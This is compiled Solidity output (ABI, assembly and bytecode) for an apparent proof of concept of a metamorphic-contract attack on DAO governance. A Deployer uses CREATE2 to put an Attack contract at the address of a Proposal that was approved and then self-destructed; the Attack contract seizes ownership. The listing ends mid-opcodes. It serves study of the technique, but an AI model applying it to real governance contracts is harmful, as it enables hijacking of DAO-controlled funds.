{
	"telefonica/redeploy.sol": {
		"Deployer": {
			"abi": [
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "addr",
							"type": "address"
						}
					],
					"name": "Log",
					"type": "event"
				},
				{
					"inputs": [
						{
							"internalType": "uint256",
							"name": "salt",
							"type": "uint256"
						}
					],
					"name": "deployAttack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "uint256",
							"name": "salt",
							"type": "uint256"
						}
					],
					"name": "deployProposal",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"telefonica/redeploy.sol\":60:432  contract Deployer {... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"telefonica/redeploy.sol\":60:432  contract Deployer {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x35bd2d43\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x481508df\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"telefonica/redeploy.sol\":283:429  function deployAttack(uint256 salt) external {... */\n    tag_3:\n      tag_5\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_6\n      swap2\n      swap1\n      tag_7\n      jump\t// in\n    tag_6:\n      tag_8\n      jump\t// in\n    tag_5:\n      stop\n        /* \"telefonica/redeploy.sol\":125:275  function deployProposal(uint256 salt) external {... */\n    tag_4:\n      tag_9\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_10\n      swap2\n      swap1\n      tag_7\n      jump\t// in\n    tag_10:\n      tag_11\n      jump\t// in\n    tag_9:\n      stop\n        /* \"telefonica/redeploy.sol\":283:429  function deployAttack(uint256 salt) external {... */\n    tag_8:\n        /* \"telefonica/redeploy.sol\":339:351  address addr */\n      0x00\n        /* \"telefonica/redeploy.sol\":387:391  salt */\n      dup2\n        /* \"telefonica/redeploy.sol\":379:392  bytes32(salt) */\n      0x00\n      shl\n        /* \"telefonica/redeploy.sol\":362:395  new Attack{salt: bytes32(salt)}() */\n      mload(0x40)\n      tag_13\n      swap1\n      tag_14\n      jump\t// in\n    tag_13:\n      dup2\n      swap1\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      0x00\n      create2\n      swap1\n      pop\n      dup1\n      iszero\n      dup1\n      iszero\n      tag_15\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_15:\n      pop\n        /* \"telefonica/redeploy.sol\":339:396  address addr = address(new Attack{salt: bytes32(salt)}()) */\n      swap1\n      pop\n        /* \"telefonica/redeploy.sol\":416:420  addr */\n      dup1\n        /* \"telefonica/redeploy.sol\":412:421  Log(addr) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xb8a00d6d8ca1be30bfec34d8f97e55f0f0fd9eeb7fb46e030516363d4cfe1ad6\n      mload(0x40)\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log2\n        /* \"telefonica/redeploy.sol\":328:429  {... */\n      pop\n        /* \"telefonica/redeploy.sol\":283:429  function deployAttack(uint256 salt) external {... */\n      pop\n      jump\t// out\n        /* \"telefonica/redeploy.sol\":125:275  function deployProposal(uint256 salt) external {... */\n    tag_11:\n        /* \"telefonica/redeploy.sol\":183:195  address addr */\n      0x00\n        /* \"telefonica/redeploy.sol\":233:237  salt */\n      dup2\n        /* \"telefonica/redeploy.sol\":225:238  bytes32(salt) */\n      0x00\n      shl\n        /* \"telefonica/redeploy.sol\":206:241  new Proposal{salt: bytes32(salt)}() */\n      mload(0x40)\n      tag_17\n      swap1\n      tag_18\n      jump\t// in\n    tag_17:\n      dup2\n      swap1\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      0x00\n      create2\n      swap1\n      pop\n      dup1\n      iszero\n      dup1\n      iszero\n      tag_19\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_19:\n      pop\n        /* \"telefonica/redeploy.sol\":183:242  address addr = address(new Proposal{salt: bytes32(salt)}()) */\n      swap1\n      pop\n        /* \"telefonica/redeploy.sol\":262:266  addr */\n      dup1\n        /* \"telefonica/redeploy.sol\":258:267  Log(addr) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xb8a00d6d8ca1be30bfec34d8f97e55f0f0fd9eeb7fb46e030516363d4cfe1ad6\n      mload(0x40)\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log2\n        /* \"telefonica/redeploy.sol\":172:275  {... */\n      pop\n        /* \"telefonica/redeploy.sol\":125:275  function deployProposal(uint256 salt) external {... */\n      pop\n      jump\t// out\n    tag_14:\n      dataSize(sub_0)\n      dup1\n      dataOffset(sub_0)\n      dup4\n      codecopy\n      add\n      swap1\n      jump\t// out\n    tag_18:\n      dataSize(sub_1)\n      dup1\n      dataOffset(sub_1)\n      dup4\n      codecopy\n      add\n      swap1\n      jump\t// out\n        /* \"#utility.yul\":88:205   */\n    tag_21:\n        /* \"#utility.yul\":197:198   */\n      0x00\n        /* \"#utility.yul\":194:195   */\n      dup1\n        /* \"#utility.yul\":187:199   */\n      revert\n        /* \"#utility.yul\":334:411   */\n    tag_23:\n        /* \"#utility.yul\":371:378   */\n      0x00\n        /* \"#utility.yul\":400:405   */\n      dup2\n        /* \"#utility.yul\":389:405   */\n      swap1\n      pop\n        /* \"#utility.yul\":334:411   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":417:539   */\n    tag_24:\n        /* \"#utility.yul\":490:514   */\n      tag_32\n        /* \"#utility.yul\":508:513   */\n      dup2\n        /* \"#utility.yul\":490:514   */\n      tag_23\n      jump\t// in\n    tag_32:\n        /* \"#utility.yul\":483:488   */\n      dup2\n        /* \"#utility.yul\":480:515   */\n      eq\n        /* \"#utility.yul\":470:533   */\n      tag_33\n      jumpi\n        /* \"#utility.yul\":529:530   */\n      0x00\n        /* \"#utility.yul\":526:527   */\n      dup1\n        /* \"#utility.yul\":519:531   */\n      revert\n        /* \"#utility.yul\":470:533   */\n    tag_33:\n        /* \"#utility.yul\":417:539   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":545:684   */\n    tag_25:\n        /* \"#utility.yul\":591:596   */\n      0x00\n        /* \"#utility.yul\":629:635   */\n      dup2\n        /* \"#utility.yul\":616:636   */\n      calldataload\n        /* \"#utility.yul\":607:636   */\n      swap1\n      pop\n        /* \"#utility.yul\":645:678   */\n      tag_35\n        /* \"#utility.yul\":672:677   */\n      dup2\n        /* \"#utility.yul\":645:678   */\n      tag_24\n      jump\t// in\n    tag_35:\n        /* \"#utility.yul\":545:684   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":690:1019   */\n    tag_7:\n        /* \"#utility.yul\":749:755   */\n      0x00\n        /* \"#utility.yul\":798:800   */\n      0x20\n        /* \"#utility.yul\":786:795   */\n      dup3\n        /* \"#utility.yul\":777:784   */\n      dup5\n        /* \"#utility.yul\":773:796   */\n      sub\n        /* \"#utility.yul\":769:801   */\n      slt\n        /* \"#utility.yul\":766:885   */\n      iszero\n      tag_37\n      jumpi\n        /* \"#utility.yul\":804:883   */\n      tag_38\n      tag_21\n      jump\t// in\n    tag_38:\n        /* \"#utility.yul\":766:885   */\n    tag_37:\n        /* \"#utility.yul\":924:925   */\n      0x00\n        /* \"#utility.yul\":949:1002   */\n      tag_39\n        /* \"#utility.yul\":994:1001   */\n      dup5\n        /* \"#utility.yul\":985:991   */\n      dup3\n        /* \"#utility.yul\":974:983   */\n      dup6\n        /* \"#utility.yul\":970:992   */\n      add\n        /* \"#utility.yul\":949:1002   */\n      tag_25\n      jump\t// in\n    tag_39:\n        /* \"#utility.yul\":939:1002   */\n      swap2\n      pop\n        /* \"#utility.yul\":895:1012   */\n      pop\n        /* \"#utility.yul\":690:1019   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n    stop\n\n    sub_0: assembly {\n            /* \"telefonica/redeploy.sol\":692:913  contract Attack {... */\n          mstore(0x40, 0x80)\n          callvalue\n          dup1\n          iszero\n          tag_1\n          jumpi\n          0x00\n          dup1\n          revert\n        tag_1:\n          pop\n          dataSize(sub_0)\n          dup1\n          dataOffset(sub_0)\n          0x00\n          codecopy\n          0x00\n          return\n        stop\n\n        sub_0: assembly {\n                /* \"telefonica/redeploy.sol\":692:913  contract Attack {... */\n              mstore(0x40, 0x80)\n              callvalue\n              dup1\n              iszero\n              tag_1\n              jumpi\n              0x00\n              dup1\n              revert\n            tag_1:\n              pop\n              jumpi(tag_2, lt(calldatasize, 0x04))\n              shr(0xe0, calldataload(0x00))\n              dup1\n              0x373058b8\n              eq\n              tag_3\n              jumpi\n              dup1\n              0x8da5cb5b\n              eq\n              tag_4\n              jumpi\n            tag_2:\n              0x00\n              dup1\n              revert\n                /* \"telefonica/redeploy.sol\":778:910  function executeProposal() external {... */\n            tag_3:\n              tag_5\n              tag_6\n              jump\t// in\n            tag_5:\n              stop\n                /* \"telefonica/redeploy.sol\":749:769  address public owner */\n            tag_4:\n              tag_7\n              tag_8\n              jump\t// in\n            tag_7:\n              mload(0x40)\n              tag_9\n              swap2\n              swap1\n              tag_10\n              jump\t// in\n            tag_9:\n              mload(0x40)\n              dup1\n              swap2\n              sub\n              swap1\n              return\n                /* \"telefonica/redeploy.sol\":778:910  function executeProposal() external {... */\n            tag_6:\n                /* \"telefonica/redeploy.sol\":830:873  Log(\"Executed code not approved by DAO :)\") */\n              0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n              mload(0x40)\n              tag_12\n              swap1\n              tag_13\n              jump\t// in\n            tag_12:\n              mload(0x40)\n              dup1\n              swap2\n              sub\n              swap1\n              log1\n                /* \"telefonica/redeploy.sol\":892:902  msg.sender */\n              caller\n                /* \"telefonica/redeploy.sol\":884:889  owner */\n              0x00\n              dup1\n                /* \"telefonica/redeploy.sol\":884:902  owner = msg.sender */\n              0x0100\n              exp\n              dup2\n              sload\n              dup2\n              0xffffffffffffffffffffffffffffffffffffffff\n              mul\n              not\n              and\n              swap1\n              dup4\n              0xffffffffffffffffffffffffffffffffffffffff\n              and\n              mul\n              or\n              swap1\n              sstore\n              pop\n                /* \"telefonica/redeploy.sol\":778:910  function executeProposal() external {... */\n              jump\t// out\n                /* \"telefonica/redeploy.sol\":749:769  address public owner */\n            tag_8:\n              0x00\n              dup1\n              sload\n              swap1\n              0x0100\n              exp\n              swap1\n              div\n              0xffffffffffffffffffffffffffffffffffffffff\n              and\n              dup2\n              jump\t// out\n                /* \"#utility.yul\":7:133   */\n            tag_14:\n                /* \"#utility.yul\":44:51   */\n              0x00\n                /* \"#utility.yul\":84:126   */\n              0xffffffffffffffffffffffffffffffffffffffff\n                /* \"#utility.yul\":77:82   */\n              dup3\n                /* \"#utility.yul\":73:127   */\n              and\n                /* \"#utility.yul\":62:127   */\n              swap1\n              pop\n                /* \"#utility.yul\":7:133   */\n              swap2\n              swap1\n              pop\n              jump\t// out\n                /* \"#utility.yul\":139:235   */\n            tag_15:\n                /* \"#utility.yul\":176:183   */\n              0x00\n                /* \"#utility.yul\":205:229   */\n              tag_23\n                /* \"#utility.yul\":223:228   */\n              dup3\n                /* \"#utility.yul\":205:229   */\n              tag_14\n              jump\t// in\n            tag_23:\n                /* \"#utility.yul\":194:229   */\n              swap1\n              pop\n                /* \"#utility.yul\":139:235   */\n              swap2\n              swap1\n              pop\n              jump\t// out\n                /* \"#utility.yul\":241:359   */\n            tag_16:\n                /* \"#utility.yul\":328:352   */\n              tag_25\n                /* \"#utility.yul\":346:351   */\n              dup2\n                /* \"#utility.yul\":328:352   */\n              tag_15\n              jump\t// in\n            tag_25:\n                /* \"#utility.yul\":323:326   */\n              dup3\n                /* \"#utility.yul\":316:353   */\n              mstore\n                /* \"#utility.yul\":241:359   */\n              pop\n              pop\n              jump\t// out\n                /* \"#utility.yul\":365:587   */\n            tag_10:\n                /* \"#utility.yul\":458:462   */\n              0x00\n                /* \"#utility.yul\":496:498   */\n              0x20\n                /* \"#utility.yul\":485:494   */\n              dup3\n                /* \"#utility.yul\":481:499   */\n              add\n                /* \"#utility.yul\":473:499   */\n              swap1\n              pop\n                /* \"#utility.yul\":509:580   */\n              tag_27\n                /* \"#utility.yul\":577:578   */\n              0x00\n                /* \"#utility.yul\":566:575   */\n              dup4\n                /* \"#utility.yul\":562:579   */\n              add\n                /* \"#utility.yul\":553:559   */\n              dup5\n                /* \"#utility.yul\":509:580   */\n              tag_16\n              jump\t// in\n            tag_27:\n                /* \"#utility.yul\":365:587   */\n              swap3\n              swap2\n              pop\n              pop\n              jump\t// out\n                /* \"#utility.yul\":593:762   */\n            tag_17:\n                /* \"#utility.yul\":677:688   */\n              0x00\n                /* \"#utility.yul\":711:717   */\n              dup3\n                /* \"#utility.yul\":706:709   */\n              dup3\n                /* \"#utility.yul\":699:718   */\n              mstore\n                /* \"#utility.yul\":751:755   */\n              0x20\n                /* \"#utility.yul\":746:749   */\n              dup3\n                /* \"#utility.yul\":742:756   */\n              add\n                /* \"#utility.yul\":727:756   */\n              swap1\n              pop\n                /* \"#utility.yul\":593:762   */\n              swap3\n              swap2\n              pop\n              pop\n              jump\t// out\n                /* \"#utility.yul\":768:983   */\n            tag_18:\n                /* \"#utility.yul\":908:942   */\n              0x457865637574656420636f6465206e6f7420617070726f766564206279204441\n                /* \"#utility.yul\":904:905   */\n              0x00\n                /* \"#utility.yul\":896:902   */\n              dup3\n                /* \"#utility.yul\":892:906   */\n              add\n                /* \"#utility.yul\":885:943   */\n              mstore\n                /* \"#utility.yul\":973:979   */\n              0x4f203a2900000000000000000000000000000000000000000000000000000000\n                /* \"#utility.yul\":968:970   */\n              0x20\n                /* \"#utility.yul\":960:966   */\n              dup3\n                /* \"#utility.yul\":956:971   */\n              add\n                /* \"#utility.yul\":949:980   */\n              mstore\n                /* \"#utility.yul\":768:983   */\n              pop\n              jump\t// out\n                /* \"#utility.yul\":985:1335   */\n            tag_19:\n                /* \"#utility.yul\":1127:1130   */\n              0x00\n                /* \"#utility.yul\":1144:1211   */\n              tag_31\n                /* \"#utility.yul\":1208:1210   */\n              0x24\n                /* \"#utility.yul\":1203:1206   */\n              dup4\n                /* \"#utility.yul\":1144:1211   */\n              tag_17\n              jump\t// in\n            tag_31:\n                /* \"#utility.yul\":1137:1211   */\n              swap2\n              pop\n                /* \"#utility.yul\":1216:1309   */\n              tag_32\n                /* \"#utility.yul\":1305:1308   */\n              dup3\n                /* \"#utility.yul\":1216:1309   */\n              tag_18\n              jump\t// in\n            tag_32:\n                /* \"#utility.yul\":1330:1332   */\n              0x40\n                /* \"#utility.yul\":1325:1328   */\n              dup3\n                /* \"#utility.yul\":1321:1333   */\n              add\n                /* \"#utility.yul\":1314:1333   */\n              swap1\n              pop\n                /* \"#utility.yul\":985:1335   */\n              swap2\n              swap1\n              pop\n              jump\t// out\n                /* \"#utility.yul\":1337:1740   */\n            tag_13:\n                /* \"#utility.yul\":1503:1507   */\n              0x00\n                /* \"#utility.yul\":1537:1539   */\n              0x20\n                /* \"#utility.yul\":1526:1535   */\n              dup3\n                /* \"#utility.yul\":1522:1540   */\n              add\n                /* \"#utility.yul\":1514:1540   */\n              swap1\n              pop\n                /* \"#utility.yul\":1582:1591   */\n              dup2\n                /* \"#utility.yul\":1576:1580   */\n              dup2\n                /* \"#utility.yul\":1572:1592   */\n              sub\n                /* \"#utility.yul\":1568:1569   */\n              0x00\n                /* \"#utility.yul\":1557:1566   */\n              dup4\n                /* \"#utility.yul\":1553:1570   */\n              add\n                /* \"#utility.yul\":1546:1593   */\n              mstore\n                /* \"#utility.yul\":1606:1737   */\n              tag_34\n                /* \"#utility.yul\":1732:1736   */\n              dup2\n                /* \"#utility.yul\":1606:1737   */\n              tag_19\n              jump\t// in\n            tag_34:\n                /* \"#utility.yul\":1598:1737   */\n              swap1\n              pop\n                /* \"#utility.yul\":1337:1740   */\n              swap2\n              swap1\n              pop\n              jump\t// out\n\n            auxdata: 0xa26469706673582212204e366ea91cac84aca13e4d17eeb135cba7f29f585b2dcd378534af0aaa5aabf464736f6c63430008120033\n        }\n    }\n\n    sub_1: assembly {\n            /* \"telefonica/redeploy.sol\":436:688  contract Proposal {... */\n          mstore(0x40, 0x80)\n          callvalue\n          dup1\n          iszero\n          tag_1\n          jumpi\n          0x00\n          dup1\n          revert\n        tag_1:\n          pop\n          dataSize(sub_0)\n          dup1\n          dataOffset(sub_0)\n          0x00\n          codecopy\n          0x00\n          return\n        stop\n\n        sub_0: assembly {\n                /* \"telefonica/redeploy.sol\":436:688  contract Proposal {... */\n              mstore(0x40, 0x80)\n              callvalue\n              dup1\n              iszero\n              tag_1\n              jumpi\n              0x00\n              dup1\n              revert\n            tag_1:\n              pop\n              jumpi(tag_2, lt(calldatasize, 0x04))\n              shr(0xe0, calldataload(0x00))\n              dup1\n              0x373058b8\n              eq\n              tag_3\n              jumpi\n              dup1\n              0x63a599a4\n              eq\n              tag_4\n              jumpi\n            tag_2:\n              0x00\n              dup1\n              revert\n                /* \"telefonica/redeploy.sol\":495:591  function executeProposal() external {... */\n            tag_3:\n              tag_5\n              tag_6\n              jump\t// in\n            tag_5:\n              stop\n                /* \"telefonica/redeploy.sol\":599:685  function emergencyStop() external {... */\n            tag_4:\n              tag_7\n              tag_8\n              jump\t// in\n            tag_7:\n              stop\n                /* \"telefonica/redeploy.sol\":495:591  function executeProposal() external {... */\n            tag_6:\n                /* \"telefonica/redeploy.sol\":547:583  Log(\"Executed code approved by DAO\") */\n              0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n              mload(0x40)\n              tag_10\n              swap1\n              tag_11\n              jump\t// in\n            tag_10:\n              mload(0x40)\n              dup1\n              swap2\n              sub\n              swap1\n              log1\n                /* \"telefonica/redeploy.sol\":495:591  function executeProposal() external {... */\n              jump\t// out\n                /* \"telefonica/redeploy.sol\":599:685  function emergencyStop() external {... */\n            tag_8:\n                /* \"telefonica/redeploy.sol\":673:674  0 */\n              0x00\n                /* \"telefonica/redeploy.sol\":644:677  selfdestruct(payable(address(0))) */\n              0xffffffffffffffffffffffffffffffffffffffff\n              and\n              selfdestruct\n                /* \"#utility.yul\":7:176   */\n            tag_13:\n                /* \"#utility.yul\":91:102   */\n              0x00\n                /* \"#utility.yul\":125:131   */\n              dup3\n                /* \"#utility.yul\":120:123   */\n              dup3\n                /* \"#utility.yul\":113:132   */\n              mstore\n                /* \"#utility.yul\":165:169   */\n              0x20\n                /* \"#utility.yul\":160:163   */\n              dup3\n                /* \"#utility.yul\":156:170   */\n              add\n                /* \"#utility.yul\":141:170   */\n              swap1\n              pop\n                /* \"#utility.yul\":7:176   */\n              swap3\n              swap2\n              pop\n              pop\n              jump\t// out\n                /* \"#utility.yul\":182:361   */\n            tag_14:\n                /* \"#utility.yul\":322:353   */\n              0x457865637574656420636f646520617070726f7665642062792044414f000000\n                /* \"#utility.yul\":318:319   */\n              0x00\n                /* \"#utility.yul\":310:316   */\n              dup3\n                /* \"#utility.yul\":306:320   */\n              add\n                /* \"#utility.yul\":299:354   */\n              mstore\n                /* \"#utility.yul\":182:361   */\n              pop\n              jump\t// out\n                /* \"#utility.yul\":367:733   */\n            tag_15:\n                /* \"#utility.yul\":509:512   */\n              0x00\n                /* \"#utility.yul\":530:597   */\n              tag_20\n                /* \"#utility.yul\":594:596   */\n              0x1d\n                /* \"#utility.yul\":589:592   */\n              dup4\n                /* \"#utility.yul\":530:597   */\n              tag_13\n              jump\t// in\n            tag_20:\n                /* \"#utility.yul\":523:597   */\n              swap2\n              pop\n                /* \"#utility.yul\":606:699   */\n              tag_21\n                /* \"#utility.yul\":695:698   */\n              dup3\n                /* \"#utility.yul\":606:699   */\n              tag_14\n              jump\t// in\n            tag_21:\n                /* \"#utility.yul\":724:726   */\n              0x20\n                /* \"#utility.yul\":719:722   */\n              dup3\n                /* \"#utility.yul\":715:727   */\n              add\n                /* \"#utility.yul\":708:727   */\n              swap1\n              pop\n                /* \"#utility.yul\":367:733   */\n              swap2\n              swap1\n              pop\n              jump\t// out\n                /* \"#utility.yul\":739:1158   */\n            tag_11:\n                /* \"#utility.yul\":905:909   */\n              0x00\n                /* \"#utility.yul\":943:945   */\n              0x20\n                /* \"#utility.yul\":932:941   */\n              dup3\n                /* \"#utility.yul\":928:946   */\n              add\n                /* \"#utility.yul\":920:946   */\n              swap1\n              pop\n                /* \"#utility.yul\":992:1001   */\n              dup2\n                /* \"#utility.yul\":986:990   */\n              dup2\n                /* \"#utility.yul\":982:1002   */\n              sub\n                /* \"#utility.yul\":978:979   */\n              0x00\n                /* \"#utility.yul\":967:976   */\n              dup4\n                /* \"#utility.yul\":963:980   */\n              add\n                /* \"#utility.yul\":956:1003   */\n              mstore\n                /* \"#utility.yul\":1020:1151   */\n              tag_23\n                /* \"#utility.yul\":1146:1150   */\n              dup2\n                /* \"#utility.yul\":1020:1151   */\n              tag_15\n              jump\t// in\n            tag_23:\n                /* \"#utility.yul\":1012:1151   */\n              swap1\n              pop\n                /* \"#utility.yul\":739:1158   */\n              swap2\n              swap1\n              pop\n              jump\t// out\n\n            auxdata: 0xa2646970667358221220948bd9ddf1078709ca59b42698dbe73302b0f47ec794281e6c145c0b7e36a6e664736f6c63430008120033\n        }\n    }\n\n    auxdata: 0xa26469706673582212209184cfdf93510a1c7d6a5fc09199b659cff7463e617423737cf978379515f71664736f6c63430008120033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b506105e9806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c806335bd2d431461003b578063481508df14610057575b600080fd5b610055600480360381019061005091906101c0565b610073565b005b610071600480360381019061006c91906101c0565b6100ef565b005b60008160001b6040516100859061016b565b8190604051809103906000f59050801580156100a5573d6000803e3d6000fd5b5090508073ffffffffffffffffffffffffffffffffffffffff167fb8a00d6d8ca1be30bfec34d8f97e55f0f0fd9eeb7fb46e030516363d4cfe1ad660405160405180910390a25050565b60008160001b60405161010190610178565b8190604051809103906000f5905080158015610121573d6000803e3d6000fd5b5090508073ffffffffffffffffffffffffffffffffffffffff167fb8a00d6d8ca1be30bfec34d8f97e55f0f0fd9eeb7fb46e030516363d4cfe1ad660405160405180910390a25050565b610253806101ee83390190565b6101738061044183390190565b600080fd5b6000819050919050565b61019d8161018a565b81146101a857600080fd5b50565b6000813590506101ba81610194565b92915050565b6000602082840312156101d6576101d5610185565b5b60006101e4848285016101ab565b9150509291505056fe608060405234801561001057600080fd5b50610233806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c8063373058b81461003b5780638da5cb5b14610045575b600080fd5b610043610063565b005b61004d6100da565b60405161005a919061013f565b60405180910390f35b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab604051610090906101dd565b60405180910390a1336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000610129826100fe565b9050919050565b6101398161011e565b82525050565b60006020820190506101546000830184610130565b92915050565b600082825260208201905092915050565b7f457865637574656420636f6465206e6f7420617070726f76656420627920444160008201527f4f203a2900000000000000000000000000000000000000000000000000000000602082015250565b60006101c760248361015a565b91506101d28261016b565b604082019050919050565b600060208201905081810360008301526101f6816101ba565b905091905056fea26469706673582212204e366ea91cac84aca13e4d17eeb135cba7f29f585b2dcd378534af0aaa5aabf464736f6c63430008120033608060405234801561001057600080fd5b50610153806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c8063373058b81461003b57806363a599a414610045575b600080fd5b61004361004f565b005b61004d610086565b005b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab60405161007c906100fd565b60405180910390a1565b600073ffffffffffffffffffffffffffffffffffffffff16ff5b600082825260208201905092915050565b7f457865637574656420636f646520617070726f7665642062792044414f000000600082015250565b60006100e7601d836100a0565b91506100f2826100b1565b602082019050919050565b60006020820190508181036000830152610116816100da565b905091905056fea2646970667358221220948bd9ddf1078709ca59b42698dbe73302b0f47ec794281e6c145c0b7e36a6e664736f6c63430008120033a26469706673582212209184cfdf93510a1c7d6a5fc09199b659cff7463e617423737cf978379515f71664736f6c63430008120033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x5E9 DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x35BD2D43 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0x481508DF EQ PUSH2 0x57 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x55 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x1C0 JUMP JUMPDEST PUSH2 0x73 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x71 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x6C SWAP2 SWAP1 PUSH2 0x1C0 JUMP JUMPDEST PUSH2 0xEF JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0x0 SHL PUSH1 0x40 MLOAD PUSH2 0x85 SWAP1 PUSH2 0x16B JUMP JUMPDEST DUP2 SWAP1 PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 PUSH1 0x0 CREATE2 SWAP1 POP DUP1 ISZERO DUP1 ISZERO PUSH2 0xA5 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xB8A00D6D8CA1BE30BFEC34D8F97E55F0F0FD9EEB7FB46E030516363D4CFE1AD6 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0x0 SHL PUSH1 0x40 MLOAD PUSH2 0x101 SWAP1 PUSH2 0x178 JUMP JUMPDEST DUP2 SWAP1 PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 PUSH1 0x0 CREATE2 SWAP1 POP DUP1 ISZERO DUP1 ISZERO PUSH2 0x121 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xB8A00D6D8CA1BE30BFEC34D8F97E55F0F0FD9EEB7FB46E030516363D4CFE1AD6 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG2 POP POP JUMP JUMPDEST PUSH2 0x253 DUP1 PUSH2 0x1EE DUP4 CODECOPY ADD SWAP1 JUMP JUMPDEST PUSH2 0x173 DUP1 PUSH2 0x441 DUP4 CODECOPY ADD SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x19D DUP2 PUSH2 0x18A JUMP JUMPDEST DUP2 EQ PUSH2 0x1A8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x1BA DUP2 PUSH2 0x194 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x1D6 JUMPI PUSH2 0x1D5 PUSH2 0x185 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x1E4 DUP5 DUP3 DUP6 ADD PUSH2 0x1AB JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x233 DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 